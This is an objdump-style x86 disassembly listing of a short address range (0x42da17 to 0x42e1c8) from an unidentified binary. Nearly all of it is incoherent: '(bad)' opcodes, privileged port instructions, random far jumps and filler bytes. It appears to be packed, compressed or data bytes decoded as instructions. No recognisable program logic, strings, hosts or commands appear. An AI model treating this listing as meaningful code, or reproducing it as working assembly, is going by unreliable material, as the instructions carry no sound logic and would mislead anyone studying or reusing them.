  42da17:	add    BYTE PTR [eax],al
  42da19:	or     al,cl
  42da1b:	(bad)  
  42da1c:	(bad)  
  42da1d:	fyl2xp1 
  42da1f:	out    0xf3,eax
  42da21:	push   eax
  42da22:	imul   esi,ebp,0x43
  42da25:	aaa    
  42da26:	repnz pop ds
  42da28:	jne    0x42da95
  42da2a:	pop    esp
  42da2b:	sbb    DWORD PTR [ebx+0x1e736b54],eax
  42da31:	push   ebx
  42da32:	std    
  42da33:	fist   DWORD PTR ds:0x3d03db75
  42da39:	test   al,0x4
  42da3b:	add    al,0x0
  42da3d:	mov    al,ds:0x3bc3a6ca
  42da42:	ins    DWORD PTR es:[edi],dx
  42da43:	mov    eax,0xbef3583
  42da48:	sti    
  42da49:	mov    BYTE PTR [ebx+0x63f8f7a6],ah
  42da4f:	mov    eax,0x57af3886
  42da54:	pop    edx
  42da55:	dec    esi
  42da56:	test   cl,0x1b
  42da59:	jne    0x42da51
  42da5b:	mov    ebx,gs
  42da5d:	idiv   BYTE PTR [esi-0x45]
  42da60:	jle    0x42da43
  42da62:	mov    edx,0x54dd5353
  42da67:	mov    esi,0x331fc2f9
  42da6c:	adc    al,0xf1
  42da6e:	fisubr DWORD PTR [edi]
  42da70:	jl     0x42da72
  42da72:	fimul  DWORD PTR [bp+di]
  42da75:	inc    ebp
  42da76:	rcl    DWORD PTR [esi],0x8d
  42da79:	cmp    DWORD PTR [edi],eax
  42da7b:	sbb    al,0x50
  42da7d:	add    BYTE PTR [eax],al
  42da7f:	add    BYTE PTR [eax],al
  42da81:	add    BYTE PTR [edi],cl
  42da83:	fwait
  42da84:	dec    edi
  42da85:	sti    
  42da86:	push   0x753ec31b
  42da8b:	push   ds
  42da8c:	les    esi,FWORD PTR [edi+0x16]
  42da8f:	sbb    BYTE PTR [eax],bh
  42da91:	and    al,0x61
  42da93:	fwait
  42da94:	sub    bl,BYTE PTR [esi+esi*8-0x73]
  42da98:	ficomp DWORD PTR [edi]
  42da9a:	jne    0x42da29
  42da9c:	add    ebx,edi
  42da9e:	jmp    0xda2ab968
  42daa3:	mov    esp,0xd9f8fab7
  42daa8:	sub    cl,BYTE PTR [eax+0x4a]
  42daab:	fistp  DWORD PTR cs:[edi]
  42daae:	dec    ebp
  42daaf:	nop
  42dab0:	mov    edx,0x6e033af9
  42dab5:	(bad)  
  42dab7:	(bad)  
  42dab8:	push   esp
  42dab9:	sti    
  42daba:	nop
  42dabb:	add    dh,BYTE PTR [esi]
  42dabd:	lods   al,BYTE PTR ds:[esi]
  42dabe:	ret    0xcac5
  42dac1:	mov    eax,0xe23cc2f1
  42dac6:	pop    ebx
  42dac7:	add    eax,0x24bc74d
  42dacc:	in     al,dx
  42dacd:	fisttp QWORD PTR [edx+0x71b1e941]
  42dad3:	dec    edx
  42dad4:	mov    ah,0x44
  42dad6:	jne    0x42daea
  42dad8:	adc    eax,0xf53df20b
  42dadd:	hlt    
  42dade:	cmc    
  42dadf:	jb     0x42dac9
  42dae1:	add    esi,DWORD PTR [ebp+0x77]
  42dae4:	xor    ebx,DWORD PTR [eax]
  42dae6:	add    BYTE PTR [eax],al
  42dae8:	add    BYTE PTR [eax],al
  42daea:	add    ah,bh
  42daec:	cmp    DWORD PTR [eax],0x16027503
  42daf2:	mov    ecx,0x43d5fe69
  42daf7:	jne    0x42daa4
  42daf9:	fcmovnu st,st(7)
  42dafb:	scas   eax,DWORD PTR es:[edi]
  42dafc:	xor    eax,0xe21b909
  42db01:	push   edx
  42db02:	cs jge 0x42db58
  42db05:	dec    edx
  42db06:	test   DWORD PTR cs:[ebx+0x358e07bb],ebp
  42db0d:	icebp  
  42db0e:	mov    eax,0x44242a61
  42db13:	jne    0x42db60
  42db15:	mov    cs,WORD PTR [ecx+edx*4+0x72e3274d]
  42db1c:	push   esi
  42db1d:	outs   dx,BYTE PTR ds:[esi]
  42db1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db1f:	jmp    0x42dac7
  42db21:	adc    BYTE PTR [edx+0x3e6ce4e],al
  42db27:	jne    0x42db78
  42db29:	fwait
  42db2a:	push   eax
  42db2b:	dec    esi
  42db2c:	xor    eax,0xfaa98cb9
  42db31:	push   ebp
  42db33:	nop
  42db34:	fdivp  st(2),st
  42db36:	je     0x42db86
  42db38:	test   al,0x74
  42db3a:	or     eax,0xde2035ea
  42db3f:	fs push cs
  42db41:	sti    
  42db42:	pop    esp
  42db43:	and    DWORD PTR [edi+0x35e3f574],0xfe44c610
  42db4d:	dec    esi
  42db4e:	mov    esi,0x0
  42db53:	add    BYTE PTR [esi+ebp*1-0x33],ah
  42db57:	sub    bh,BYTE PTR [ecx+0x79]
  42db5a:	inc    ebx
  42db5b:	add    eax,0xf6bf8561
  42db60:	dec    bl
  42db62:	(bad)  
  42db63:	call   0xcd878bde
  42db68:	jns    0x42db61
  42db6a:	xor    DWORD PTR [eax+0x6c000271],0xffffffae
  42db71:	test   DWORD PTR [ebx+0x27198],0xfffe7c6a
  42db7b:	fnstsw WORD PTR [edx]
  42db7d:	sar    bh,0xe8
  42db80:	jbe    0x42db1c
  42db82:	mov    fs,WORD PTR [ebx+eiz*8]
  42db85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db86:	sub    DWORD PTR [ecx],0x7a
  42db89:	xchg   BYTE PTR [ebp-0x4fd8917],dh
  42db8f:	cli    
  42db90:	retf   
  42db91:	adc    eax,0x236d8d8
  42db96:	test   DWORD PTR [ecx],ebp
  42db98:	jp     0x42db20
  42db9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db9b:	jmp    0x1192de16
  42dba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dba1:	imul   edi,ecx,0x2445f81e
  42dba7:	in     eax,0xf5
  42dba9:	imul   ecx,DWORD PTR [edx],0xfaa9f965
  42dbaf:	add    BYTE PTR [ebp+edi*2+0x31],bl
  42dbb3:	push   0x5c
  42dbb5:	push   esi
  42dbb6:	call   0x42dc2e
  42dbbb:	add    BYTE PTR [eax],al
  42dbbd:	nop
  42dbbe:	jo     0x42dbb5
  42dbc0:	mov    edi,DWORD PTR [edi+esi*2]
  42dbc3:	outs   dx,BYTE PTR ds:[esi]
  42dbc4:	and    al,0x30
  42dbc6:	xor    eax,0x74
  42dbc9:	xchg   esi,eax
  42dbca:	popf   
  42dbcb:	xor    ebp,DWORD PTR [ecx+ebx*8+0x44]
  42dbcf:	add    BYTE PTR [ebx+0x448cfaa9],cl
  42dbd5:	add    BYTE PTR [esi],0x50
  42dbd8:	inc    DWORD PTR [ebx]
  42dbda:	jg     0x42db9c
  42dbdc:	fiadd  DWORD PTR [edi+edi*1+0x0]
  42dbe0:	(bad)  
  42dbe1:	push   eax
  42dbe2:	mov    ds:0xfedc031a,al
  42dbe7:	(bad)  
  42dbe8:	(bad)  
  42dbe9:	loope  0x42dbc0
  42dbeb:	cmovo  ecx,esp
  42dbee:	cmp    BYTE PTR [edx+0x7e7cab74],0x24
  42dbf5:	in     al,dx
  42dbf6:	add    eax,0x2b70000
  42dbfb:	test   ch,cl
  42dbfd:	(bad)  
  42dbfe:	(bad)  
  42dbff:	je     0x42dc31
  42dc01:	inc    edx
  42dc02:	add    bl,BYTE PTR [eax-0x33]
  42dc05:	fild   WORD PTR ds:0xb4937410
  42dc0b:	scas   al,BYTE PTR es:[edi]
  42dc0c:	and    al,0x54
  42dc0e:	add    eax,0xe9390000
  42dc13:	and    ebx,DWORD PTR [eax]
  42dc15:	in     al,dx
  42dc16:	jo     0x42dc45
  42dc18:	mov    DWORD PTR [eax],eax
  42dc1a:	leave  
  42dc1b:	retf   0x8c00
  42dc1e:	add    eax,0x44bf
  42dc23:	add    BYTE PTR [eax],al
  42dc25:	add    BYTE PTR [eax-0x62],dh
  42dc28:	cld    
  42dc29:	call   FWORD PTR [ebp+0x5]
  42dc2c:	not    DWORD PTR ds:0x400ea0
  42dc32:	jne    0x42dc4a
  42dc34:	mov    edi,0xfe838674
  42dc39:	jg     0x42dcb0
  42dc3b:	fwait
  42dc3c:	sub    BYTE PTR [eax],al
  42dc3e:	dec    edx
  42dc3f:	das    
  42dc40:	fistp  DWORD PTR [ebx]
  42dc42:	inc    edx
  42dc43:	ins    BYTE PTR es:[edi],dx
  42dc44:	mov    cl,0x14
  42dc46:	add    ebp,ecx
  42dc48:	add    BYTE PTR ds:[edx],dh
  42dc4b:	inc    edi
  42dc4c:	loopne 0x42dc59
  42dc4e:	sub    ch,BYTE PTR [esi-0x644af0fe]
  42dc54:	xchg   DWORD PTR [ebx+0x51],eax
  42dc57:	stos   DWORD PTR es:[edi],eax
  42dc58:	push   ebx
  42dc59:	pop    edx
  42dc5a:	scas   al,BYTE PTR es:[edi]
  42dc5b:	xor    al,0x9b
  42dc5d:	pop    esp
  42dc5e:	aaa    
  42dc5f:	test   DWORD PTR [ebx],0xabbeee55
  42dc65:	mov    ebx,0x83b45931
  42dc6a:	mov    ch,0x5
  42dc6c:	std    
  42dc6d:	pop    esp
  42dc6e:	jmp    0x4f9b:0x36cc86bd
  42dc75:	push   edx
  42dc76:	out    dx,al
  42dc77:	or     eax,0x802b5310
  42dc7c:	sub    dl,BYTE PTR [eax]
  42dc7e:	pop    edi
  42dc7f:	fwait
  42dc80:	mov    bl,0x74
  42dc82:	ins    DWORD PTR es:[edi],dx
  42dc83:	xor    BYTE PTR [ebx],cl
  42dc85:	mov    WORD PTR [eax+0x5203db],gs
  42dc8b:	add    BYTE PTR [eax],al
  42dc8d:	add    BYTE PTR [eax],al
  42dc8f:	mov    dl,0xc5
  42dc91:	push   cs
  42dc92:	xchg   DWORD PTR [ebp-0x5df3d4b9],ebp
  42dc98:	lds    eax,FWORD PTR [esi]
  42dc9a:	sti    
  42dc9b:	and    BYTE PTR [ebx],0xc3
  42dc9e:	ds jne 0x42dcd5
  42dca1:	fadd   QWORD PTR [edx+ecx*4-0x617ab53f]
  42dca8:	jb     0x42dcf8
  42dcaa:	test   DWORD PTR [ebx-0x4c80bd92],eax
  42dcb0:	add    ch,cl
  42dcb2:	das    
  42dcb3:	mov    dh,0x83
  42dcb5:	fwait
  42dcb6:	adc    esi,DWORD PTR [ebp+0x2e]
  42dcb9:	test   al,0x75
  42dcbb:	sbb    bl,BYTE PTR [edi-0x5858fc5b]
  42dcc1:	fisttp DWORD PTR [edi]
  42dcc3:	jp     0x42dd07
  42dcc5:	jmp    0xd0d5677
  42dcca:	inc    ecx
  42dccb:	jne    0x42dcce
  42dccd:	je     0x42dcad
  42dccf:	call   0xf3a7:0x754455d2
  42dcd6:	mov    edi,0x7ee94270
  42dcdb:	fisubr DWORD PTR [esi]
  42dcdd:	loopne 0x42dc67
  42dcdf:	or     bl,BYTE PTR [ebx-0x57f326f6]
  42dce5:	int    0x1
  42dce7:	push   ebx
  42dce8:	ret    0xc36c
  42dceb:	xchg   bh,bh
  42dced:	gs push es
  42dcef:	int    0x9e
  42dcf1:	and    eax,0x4
  42dcf6:	add    BYTE PTR [eax],al
  42dcf8:	je     0x42dd4a
  42dcfa:	call   0x3e04:0x29137d0e
  42dd01:	dec    eax
  42dd02:	pop    esi
  42dd03:	shr    BYTE PTR [ebx],0x45
  42dd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd07:	adc    esi,DWORD PTR [ebp+0x4d]
  42dd0a:	outs   dx,BYTE PTR ds:[esi]
  42dd0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd0c:	cmc    
  42dd0d:	xchg   esi,eax
  42dd0e:	or     BYTE PTR [eax],al
  42dd10:	jne    0x42dd14
  42dd12:	push   ss
  42dd13:	mov    DWORD PTR [ecx-0x6],edx
  42dd16:	mov    edx,0xe0961d4c
  42dd1b:	inc    ebx
  42dd1c:	jne    0x42dd71
  42dd1e:	fs jle 0x42dcf7
  42dd21:	stos   DWORD PTR es:[edi],eax
  42dd22:	dec    ecx
  42dd23:	mov    ah,0x42
  42dd25:	jnp    0x42dd5e
  42dd27:	stos   DWORD PTR es:[edi],eax
  42dd28:	retf   
  42dd29:	xchg   ebp,eax
  42dd2a:	cmp    esi,DWORD PTR [ecx+edi*8+0x6ebbffc2]
  42dd31:	and    bh,bh
  42dd33:	nop
  42dd34:	pop    ds
  42dd35:	dec    esi
  42dd36:	add    ecx,ebp
  42dd38:	jbe    0x42ddaf
  42dd3a:	test   BYTE PTR [ebp+0x2b],cl
  42dd3d:	lods   al,BYTE PTR ds:[esi]
  42dd3e:	cli    
  42dd3f:	mov    ecx,0x12a37df3
  42dd44:	or     DWORD PTR [edi+ecx*2+0x111e7b06],ebp
  42dd4b:	test   eax,0xe1447976
  42dd50:	cmc    
  42dd51:	scas   al,BYTE PTR es:[edi]
  42dd52:	cli    
  42dd53:	je     0x42dd87
  42dd55:	sbb    eax,0xd83bd204
  42dd5a:	cli    
  42dd5b:	ins    BYTE PTR es:[edi],dx
  42dd5c:	add    BYTE PTR [eax],al
  42dd5e:	add    BYTE PTR [eax],al
  42dd60:	add    ah,ch
  42dd62:	into   
  42dd63:	cld    
  42dd64:	(bad)  
  42dd65:	out    0x9e,al
  42dd67:	test   BYTE PTR ds:0xa983abc6,0x76
  42dd6e:	jge    0x42dd44
  42dd70:	jmp    0xe7c9dfeb
  42dd75:	jnp    0x42dd79
  42dd77:	lea    edx,[ebp+edx*2-0x5a]
  42dd7b:	cli    
  42dd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd7d:	inc    ebx
  42dd7e:	aaa    
  42dd7f:	sti    
  42dd80:	cmp    DWORD PTR [ebp+0x7d],ebp
  42dd83:	mov    edi,0xf827d91d
  42dd88:	call   0xe9424c7e
  42dd8d:	jbe    0x42dd43
  42dd8f:	test   BYTE PTR [ebp+0x4],cl
  42dd92:	lods   al,BYTE PTR ds:[esi]
  42dd93:	cli    
  42dd94:	fnstenv [edi+0x7e]
  42dd97:	sub    ecx,0x76
  42dd9a:	add    dh,dl
  42dd9c:	scas   eax,DWORD PTR es:[edi]
  42dd9d:	scas   al,BYTE PTR es:[edi]
  42dd9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd9f:	outs   dx,BYTE PTR ds:[esi]
  42dda0:	or     dh,ah
  42dda2:	jge    0x42dd7b
  42dda4:	push   esp
  42dda5:	out    0xab,al
  42dda7:	dec    edi
  42dda8:	inc    ecx
  42dda9:	aam    0xa6
  42ddab:	cli    
  42ddac:	add    BYTE PTR [esi+edi*2+0x279f74ba],bl
  42ddb3:	or     DWORD PTR [ebx-0x536c7e73],ecx
  42ddb9:	mov    eax,ds:0x2f52f571
  42ddbe:	jno    0x42de0a
  42ddc0:	or     cl,bl
  42ddc2:	mov    esi,0xc273
  42ddc7:	add    BYTE PTR [eax],al
  42ddc9:	add    BYTE PTR [edx+0x38],bh
  42ddcc:	or     BYTE PTR [ecx],al
  42ddce:	call   0x94c86ac6
  42ddd3:	jae    0x42ddca
  42ddd5:	(bad)  
  42ddd6:	fmul   QWORD PTR [ebp+ecx*4-0x7b]
  42ddda:	test   al,0x55
  42dddc:	cmc    
  42dddd:	dec    DWORD PTR [edx+ecx*4]
  42dde0:	or     eax,0x837111ed
  42dde5:	ror    cl,0xfb
  42dde8:	popa   
  42dde9:	add    esp,DWORD PTR [ebx-0x7b]
  42ddec:	sbb    BYTE PTR [ebp-0xde267],cl
  42ddf2:	xor    edx,DWORD PTR [edx-0x7d]
  42ddf5:	into   
  42ddf6:	and    al,0xf8
  42ddf8:	idiv   bh
  42ddfa:	ret    
  42ddfb:	and    al,0xf3
  42ddfd:	test   DWORD PTR [ebx],esp
  42ddff:	out    dx,al
  42de00:	dec    esp
  42de01:	adc    DWORD PTR [ebx],0xffffffff
  42de04:	jae    0x42de73
  42de06:	dec    edi
  42de07:	jo     0x42de05
  42de09:	jae    0x42de7f
  42de0b:	and    eax,0x48dd8b09
  42de10:	lea    edx,[ebp-0xa8de0]
  42de16:	pop    esi
  42de17:	dec    ebp
  42de18:	not    DWORD PTR [eax-0x30]
  42de1b:	jl     0x42de0f
  42de1d:	add    ebp,DWORD PTR [eax+0x1367e831]
  42de23:	jo     0x42de1a
  42de25:	neg    dl
  42de27:	test   eax,0xf87573fe
  42de2c:	add    BYTE PTR [eax+eax*1+0x0],0xad
  42de34:	ss scas al,BYTE PTR es:[edi]
  42de36:	cli    
  42de37:	and    eax,0x75001c53
  42de3c:	fwait
  42de3d:	cmp    BYTE PTR [edi+0x979c801],0xfe
  42de44:	cdq    
  42de45:	jg     0x42dddb
  42de47:	sbb    esi,ebx
  42de49:	lods   eax,DWORD PTR ds:[esi]
  42de4a:	cli    
  42de4b:	(bad)  
  42de4c:	push   0x166d4fad
  42de51:	mov    edi,0x88466f74
  42de56:	stos   DWORD PTR es:[edi],eax
  42de57:	dec    eax
  42de58:	cld    
  42de59:	lods   eax,DWORD PTR ds:[esi]
  42de5a:	dec    edi
  42de5b:	inc    edx
  42de5c:	cs idiv edx
  42de5f:	pusha  
  42de60:	and    edx,DWORD PTR [eax+eax*2]
  42de63:	jne    0x42de83
  42de65:	mov    edi,0xaf9af00a
  42de6a:	cli    
  42de6b:	and    dl,al
  42de6d:	cld    
  42de6e:	cs sub al,0x18
  42de71:	lods   al,BYTE PTR ds:[esi]
  42de72:	std    
  42de73:	sub    DWORD PTR [esi],0xffffffbf
  42de76:	mov    WORD PTR [edx+ebx*4-0x378aeb51],cs
  42de7d:	ds add dh,ch
  42de80:	push   0xffffff82
  42de82:	cli    
  42de83:	push   0x87f983a3
  42de88:	pop    es
  42de89:	add    eax,0xb0e47966
  42de8e:	je     0x42defd
  42de90:	mov    WORD PTR [edx],ss
  42de92:	and    BYTE PTR [ebx+ebx*8+0x3],0x52
  42de97:	add    BYTE PTR [eax],al
  42de99:	add    BYTE PTR [eax],al
  42de9b:	add    dl,cl
  42de9d:	lds    eax,FWORD PTR [edx+0x7b9b350d]
  42dea3:	ret    0xd1a
  42dea6:	dec    ebp
  42dea7:	leave  
  42dea8:	mov    bh,0x9e
  42deaa:	(bad)  
  42deab:	push   edx
  42deac:	data16 add ah,BYTE PTR [edx-0x15]
  42deb0:	push   ds
  42deb1:	fdivrp st(0),st
  42deb3:	ss jno 0x42dea6
  42deb6:	sub    BYTE PTR [ebp+0x17a27929],bl
  42debc:	push   edx
  42debd:	mov    ebp,0x2e2d3fbc
  42dec2:	add    eax,0xef95003c
  42dec7:	xor    DWORD PTR [ebp-0x4b82c0d4],eax
  42decd:	mul    BYTE PTR [ecx]
  42decf:	clc    
  42ded0:	sub    ah,BYTE PTR [esp+edx*4-0x45c9119]
  42ded7:	and    eax,DWORD PTR [edx+0xa86e942]
  42dedd:	cs aam 0x48
  42dee0:	mov    ah,BYTE PTR [ecx+ebx*8]
  42dee3:	xor    eax,0x7d229857
  42dee8:	mov    ah,0xf6
  42deea:	pop    edi
  42deeb:	sub    al,0x79
  42deed:	xchg   edi,eax
  42deee:	icebp  
  42deef:	push   ebx
  42def0:	push   ds
  42def1:	das    
  42def2:	add    eax,0x490e1e00
  42def7:	adc    eax,0xc36402b5
  42defc:	xor    esp,0x496d
  42df02:	add    BYTE PTR [eax],al
  42df04:	add    BYTE PTR [ecx-0x66],dh
  42df07:	pop    ebp
  42df08:	dec    ecx
  42df09:	jmp    DWORD PTR [ebx-0x62963713]
  42df0f:	mov    ebp,0x42021a5a
  42df14:	(bad)  
  42df15:	jbe    0x42df19
  42df17:	xor    eax,DWORD PTR [ecx]
  42df19:	daa    
  42df1a:	das    
  42df1b:	int    0xfb
  42df1d:	daa    
  42df1e:	jne    0x42df6c
  42df20:	je     0x42df94
  42df22:	add    ecx,ebp
  42df24:	add    edi,edx
  42df26:	repz arpl WORD PTR [edx+0x61fffc46],di
  42df2d:	ja     0x42df4b
  42df2f:	add    DWORD PTR [esi-0x7a],ebp
  42df32:	and    esp,DWORD PTR [ebx]
  42df34:	jmp    0xc79d42e2
  42df39:	pop    ds
  42df3a:	jg     0x42dfaa
  42df3c:	icebp  
  42df3d:	ja     0x42df41
  42df3f:	add    BYTE PTR [edi-0x64000050],ch
  42df45:	add    DWORD PTR [edi-0x5c31b280],edx
  42df4b:	cli    
  42df4c:	jmp    0x5c96301a
  42df51:	mov    bl,0x5a
  42df53:	dec    edi
  42df54:	das    
  42df55:	mov    ebx,0x9010ffab
  42df5a:	vmovshdup xmm2,xmm3
  42df5e:	cs int3 
  42df60:	add    DWORD PTR [edx+ebx*8+0x1df906fa],edx
  42df67:	aam    0xe9
  42df69:	add    BYTE PTR [eax],al
  42df6b:	add    BYTE PTR [eax],al
  42df6d:	add    BYTE PTR [ecx-0xd533d37],bh
  42df73:	jle    0x42dfea
  42df75:	test   eax,0x4b899a76
  42df7a:	shl    BYTE PTR [edi+0x76193c86],cl
  42df80:	jle    0x42df73
  42df82:	jns    0x42df86
  42df84:	add    BYTE PTR [eax-0x44],ah
  42df87:	mov    ds:0x2016a8c,al
  42df8c:	add    cl,ch
  42df8e:	xor    BYTE PTR [esi],bh
  42df90:	in     al,dx
  42df91:	jmp    0x99371d51
  42df96:	inc    eax
  42df97:	inc    edx
  42df98:	add    BYTE PTR [eax+0x2c],dh
  42df9b:	mov    esi,0x7bf92488
  42dfa0:	inc    esp
  42dfa1:	or     DWORD PTR [esi-0x2d],0x7c0d2486
  42dfa8:	ja     0x42dfaa
  42dfaa:	iret   
  42dfab:	xor    DWORD PTR [esi+0x3d],0xf07c2524
  42dfb2:	and    DWORD PTR [esi+ebp*2+0x43],ebp
  42dfb6:	dec    ecx
  42dfb7:	cmp    esp,esp
  42dfb9:	push   eax
  42dfba:	sub    DWORD PTR [ecx],edi
  42dfbc:	enter  0xc450,0xa6
  42dfc0:	or     al,BYTE PTR [eax]
  42dfc2:	pushf  
  42dfc3:	push   es
  42dfc4:	idiv   edi
  42dfc6:	pushf  
  42dfc7:	(bad)  
  42dfc8:	div    BYTE PTR [esi-0x70]
  42dfcb:	mov    ebx,0xfe90e443
  42dfd0:	(bad)  
  42dfd1:	inc    DWORD PTR [eax]
  42dfd3:	add    BYTE PTR [eax],al
  42dfd5:	add    BYTE PTR [eax],al
  42dfd7:	stos   DWORD PTR es:[edi],eax
  42dfd8:	sti    
  42dfd9:	pop    ds
  42dfda:	push   ss
  42dfdb:	sbb    al,0x6
  42dfdd:	test   eax,eax
  42dfdf:	add    ebx,edi
  42dfe1:	mov    WORD PTR [ebp-0x5c],es
  42dfe4:	div    DWORD PTR ss:[esi+0x54]
  42dfe8:	jno    0x42dffd
  42dfea:	mov    BYTE PTR [esi+0x46],cl
  42dfed:	add    BYTE PTR [ebp-0x1a7c5e74],al
  42dff3:	dec    ebp
  42dff4:	push   es
  42dff5:	add    bh,bh
  42dff7:	mov    cl,0x81
  42dff9:	loop   0x42e020
  42dffb:	sbb    esi,DWORD PTR [ecx-0xb]
  42dffe:	mov    edx,DWORD PTR [ecx+0x5a]
  42e001:	add    eax,0x4a714cb6
  42e006:	call   0x3b7f76
  42e00b:	nop
  42e00c:	lds    esi,FWORD PTR [ebx+0x18]
  42e00f:	mov    dl,0x85
  42e011:	xor    eax,0xbc8a0b00
  42e016:	add    esp,ebx
  42e018:	add    eax,0x1f32c02b
  42e01d:	inc    ch
  42e01f:	xchg   ecx,eax
  42e020:	ins    DWORD PTR es:[edi],dx
  42e021:	(bad)  
  42e022:	call   0x42e667
  42e027:	jne    0x42e02e
  42e029:	sbb    al,ch
  42e02b:	mov    al,BYTE PTR [ebx+0x6bf8faaf]
  42e031:	xor    dl,BYTE PTR [ebx]
  42e033:	out    dx,al
  42e034:	out    dx,al
  42e035:	mov    bh,0xa
  42e037:	jmp    0x42dff3
  42e039:	stc    
  42e03a:	mov    cl,0x0
  42e03c:	add    BYTE PTR [eax],al
  42e03e:	add    BYTE PTR [eax],al
  42e040:	cmp    al,0x30
  42e042:	push   ecx
  42e043:	push   ecx
  42e044:	out    dx,al
  42e045:	cmp    edx,DWORD PTR [edi-0x55be8a2d]
  42e04b:	xchg   BYTE PTR [ebp-0x7cd0febc],al
  42e051:	es mov ch,0xa
  42e054:	stc    
  42e055:	adc    eax,DWORD PTR [eax+eax*1]
  42e058:	jne    0x42e06e
  42e05a:	xor    ah,dl
  42e05c:	cmp    ebp,DWORD PTR [esi-0x58]
  42e05f:	push   ecx
  42e061:	out    dx,eax
  42e062:	xor    ah,BYTE PTR [edi]
  42e064:	out    dx,al
  42e065:	scas   eax,DWORD PTR es:[edi]
  42e066:	jg     0x42e0b4
  42e068:	cmp    DWORD PTR [edx+0x51],ebx
  42e06b:	sti    
  42e06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e06d:	mov    ebx,0xaec0bf87
  42e072:	and    al,0x7f
  42e074:	shl    bh,0xa9
  42e077:	or     ah,cl
  42e079:	jmp    0x275:0xbaa8bf82
  42e080:	lahf   
  42e081:	mov    al,0x54
  42e083:	sti    
  42e084:	(bad)  
  42e087:	xlat   BYTE PTR ds:[ebx]
  42e088:	jg     0x42e0f5
  42e08a:	test   eax,0xa5edfdbf
  42e08f:	xchg   BYTE PTR [eax+0x5db2fcbb],dh
  42e095:	adc    DWORD PTR [ebx],0x23
  42e098:	jne    0x42e045
  42e09a:	and    al,0x37
  42e09c:	int    0xdc
  42e09e:	cmp    edi,DWORD PTR [eax+0x3d6a5]
  42e0a4:	add    BYTE PTR [eax],al
  42e0a6:	add    BYTE PTR [eax],al
  42e0a8:	add    BYTE PTR [ebx+0x2],bl
  42e0ab:	fmulp  st(3),st
  42e0ad:	addr16 loopne 0x42e0be
  42e0b0:	add    BYTE PTR cs:[edi-0x5f30531e],al
  42e0b7:	inc    BYTE PTR [ebx]
  42e0b9:	and    eax,0xba69baaa
  42e0be:	mov    al,ds:0x8581466e
  42e0c3:	lods   al,BYTE PTR ds:[esi]
  42e0c4:	add    BYTE PTR [ebp-0x60521997],bl
  42e0ca:	daa    
  42e0cb:	sub    cl,al
  42e0cd:	jb     0x42e0f7
  42e0cf:	jo     0x42e058
  42e0d1:	jle    0x42e074
  42e0d3:	push   ecx
  42e0d4:	lods   eax,DWORD PTR ds:[esi]
  42e0d5:	adc    al,0x8b
  42e0d7:	imul   edi,esi,0x7f
  42e0da:	mov    al,ds:0xdd97f41
  42e0df:	cmp    ch,BYTE PTR [ebp-0x63d57391]
  42e0e5:	jl     0x42e0ed
  42e0e7:	sub    ebp,DWORD PTR [ebp+0x529bc2f6]
  42e0ed:	(bad)  
  42e0ee:	stos   BYTE PTR es:[edi],al
  42e0ef:	jo     0x42e0f9
  42e0f1:	dec    edi
  42e0f2:	mov    al,ds:0xdc1c46c
  42e0f7:	pop    esi
  42e0f8:	push   es
  42e0f9:	fild   DWORD PTR [ecx]
  42e0fb:	outs   dx,BYTE PTR ds:[esi]
  42e0fc:	mov    esi,0xa40ff33f
  42e101:	xor    ah,BYTE PTR [eax+0xef17ee8]
  42e107:	jmp    0xc9:0x16331fac
  42e10e:	add    BYTE PTR [eax],al
  42e110:	add    BYTE PTR [eax],al
  42e112:	adc    dl,BYTE PTR [ebp-0x1a]
  42e115:	lods   eax,DWORD PTR ds:[esi]
  42e116:	ja     0xfb218c4
  42e11c:	xchg   edx,eax
  42e11d:	xchg   BYTE PTR [esi-0x61],ch
  42e120:	shr    DWORD PTR [edx+esi*4+0x7207354a],0xaa
  42e128:	(bad)  
  42e129:	(bad)  [ebx-0xc89f4fd]
  42e12f:	or     ebx,edi
  42e131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e132:	or     DWORD PTR [edx],esp
  42e134:	shr    DWORD PTR [edx-0x4d4cf332],0x4d
  42e13b:	inc    esi
  42e13c:	lock pop es
  42e13e:	ds test ecx,0x87030c2c
  42e145:	and    al,0x11
  42e147:	mov    DWORD PTR [ecx+ecx*4+0x2f],ecx
  42e14b:	out    dx,eax
  42e14c:	xchg   BYTE PTR [ecx+ebp*8],ah
  42e14f:	and    DWORD PTR [edi+0x8950e9],eax
  42e155:	fs loope 0x42e164
  42e158:	test   BYTE PTR [esi+esi*2+0x2],ah
  42e15c:	add    BYTE PTR [edx+0x79],ah
  42e15f:	lea    ecx,[ecx+eiz*1+0x27]
  42e163:	xor    edi,ebx
  42e165:	cdq    
  42e166:	dec    esi
  42e167:	xchg   BYTE PTR [edi+0x7f2482bc],bh
  42e16d:	lods   al,BYTE PTR ds:[esi]
  42e16e:	cs pushf 
  42e170:	or     bh,BYTE PTR [ebp+0x36]
  42e173:	fild   DWORD PTR [eax]
  42e175:	xchg   esp,eax
  42e176:	add    BYTE PTR [eax],al
  42e178:	add    BYTE PTR [eax],al
  42e17a:	add    BYTE PTR [esi-0x78],cl
  42e17d:	add    al,BYTE PTR [ebx-0x4604cc8a]
  42e183:	and    cl,BYTE PTR [eax+0x513efd44]
  42e189:	push   DWORD PTR [eax+0x7c480c6a]
  42e18f:	(bad)  
  42e190:	sub    BYTE PTR [edx],cl
  42e192:	es mov ebx,0x76e910a6
  42e198:	add    ah,bh
  42e19a:	lock jo 0x42e1aa
  42e19d:	ret    
  42e19e:	sub    al,0xd5
  42e1a0:	add    BYTE PTR [eax],al
  42e1a2:	jmp    0xd01c1d
  42e1a7:	cmp    DWORD PTR [edx],edx
  42e1a9:	jecxz  0x42e1b3
  42e1ab:	sbb    ebp,DWORD PTR [ebx-0xb]
  42e1ae:	mov    ebx,DWORD PTR [ecx-0x3348faaa]
  42e1b4:	xor    al,BYTE PTR [ebx+0xc009cc6]
  42e1ba:	pop    ebx
  42e1bb:	popa   
  42e1bc:	jmp    0x6ce7ca50
  42e1c1:	sti    
  42e1c2:	inc    DWORD PTR [ebp+0x72c0854d]
  42e1c8:	hlt    
